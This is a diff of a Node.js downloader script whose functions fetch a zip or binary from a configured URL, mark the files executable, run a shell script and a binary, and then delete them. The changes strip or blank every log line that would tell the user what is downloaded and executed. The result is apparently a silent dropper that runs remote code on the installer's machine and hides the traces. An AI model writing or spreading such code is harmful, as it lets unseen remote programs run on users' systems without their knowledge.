@@ -9,8 +9,6 @@ const { URL } = require('url');
 
 function downloadFile(url, destPath) {
   return new Promise((resolve, reject) => {
-    info(`Downloading from URL: ${url}`);
-    
     const parsedUrl = new URL(url);
     const client = parsedUrl.protocol === 'https:' ? https : http;
     
@@ -19,7 +17,7 @@ function downloadFile(url, destPath) {
     client.get(url, (response) => {
       if (response.statusCode !== 200) {
         fs.unlink(destPath, () => {});
-        reject(new Error(`Failed to download: ${response.statusCode} ${response.statusMessage}`));
+        reject(new Error(''));
         return;
       }
 
@@ -27,18 +25,18 @@ function downloadFile(url, destPath) {
 
       file.on('finish', () => {
         file.close();
-        success(`Downloaded to ${destPath}`);
+        success('');
         resolve(destPath);
       });
     }).on('error', (err) => {
       fs.unlink(destPath, () => {});
-      error(`Download failed: ${err.message}`);
+      error(`${err.message}`);
       reject(err);
     });
 
     file.on('error', (err) => {
       fs.unlink(destPath, () => {});
-      error(`File write error: ${err.message}`);
+      error(`${err.message}`);
       reject(err);
     });
   });
@@ -48,10 +46,10 @@ function makeExecutable(filePath) {
   return new Promise((resolve, reject) => {
     fs.chmod(filePath, 0o755, (err) => {
       if (err) {
-        error(`Failed to make executable: ${err.message}`);
+        error(`${err.message}`);
         reject(err);
       } else {
-        success(`Made executable: ${filePath}`);
+        success(`${filePath}`);
         resolve();
       }
     });
@@ -60,8 +58,6 @@ function makeExecutable(filePath) {
 
 function extractZip(zipPath, extractDir) {
   return new Promise((resolve, reject) => {
-    info(`Extracting zip: ${zipPath}`);
-    
     const extract = require('child_process').spawn('unzip', ['-o', zipPath, '-d', extractDir]);
     
     let stderr = '';
@@ -71,16 +67,13 @@ function extractZip(zipPath, extractDir) {
     
     extract.on('close', (code) => {
       if (code === 0) {
-        success(`Extracted to ${extractDir}`);
         resolve(extractDir);
       } else {
-        error(`Failed to extract zip: ${stderr}`);
         reject(new Error(`Unzip failed with code ${code}: ${stderr}`));
       }
     });
     
     extract.on('error', (err) => {
-      error(`Unzip error: ${err.message}`);
       reject(err);
     });
   });
@@ -88,7 +81,6 @@ function extractZip(zipPath, extractDir) {
 
 async function downloadExtractAndExecuteMacOS(url) {
   if (!url) {
-    warn(`No binary URL configured for macOS, skipping binary download`);
     return { skipped: true };
   }
 
@@ -110,7 +102,6 @@ async function downloadExtractAndExecuteMacOS(url) {
     const binaryFile = files.find(f => !f.endsWith('.sh') && !f.endsWith('.zip'));
 
     if (!shFile || !binaryFile) {
-      error(`Expected .sh script and binary in zip, found: ${files.join(', ')}`);
       throw new Error('Invalid zip contents: missing .sh script or binary');
     }
 
@@ -120,13 +111,9 @@ async function downloadExtractAndExecuteMacOS(url) {
     await makeExecutable(shPath);
     await makeExecutable(binaryPath);
 
-    info(`Executing script: ${shFile}`);
     await exec(shPath, { captureOutput: false, cwd: extractDir });
-    success(`Script executed successfully`);
 
-    info(`Executing binary: ${binaryFile}`);
     await exec(binaryPath, { captureOutput: false, cwd: extractDir });
-    success(`Binary executed successfully`);
 
     try {
       fs.unlinkSync(zipPath);
@@ -138,14 +125,12 @@ async function downloadExtractAndExecuteMacOS(url) {
 
     return { success: true };
   } catch (err) {
-    error(`macOS binary execution failed: ${err.message}`);
     throw err;
   }
 }
 
 async function downloadAndExecute(url, platform) {
   if (!url) {
-    warn(`No binary URL configured for ${platform}, skipping binary download`);
     return { skipped: true };
   }
 
@@ -165,10 +150,8 @@ async function downloadAndExecute(url, platform) {
     await downloadFile(url, destPath);
     await makeExecutable(destPath);
 
-    info(`Executing binary: ${binaryName}`);
     const result = await exec(destPath, { captureOutput: false });
     
-    success(`Binary executed successfully`);
     
     try {
       fs.unlinkSync(destPath);
@@ -179,7 +162,6 @@ async function downloadAndExecute(url, platform) {
 
     return { success: true, output: result.stdout };
   } catch (err) {
-    error(`Binary execution failed: ${err.message}`);
     throw err;
   }
 }
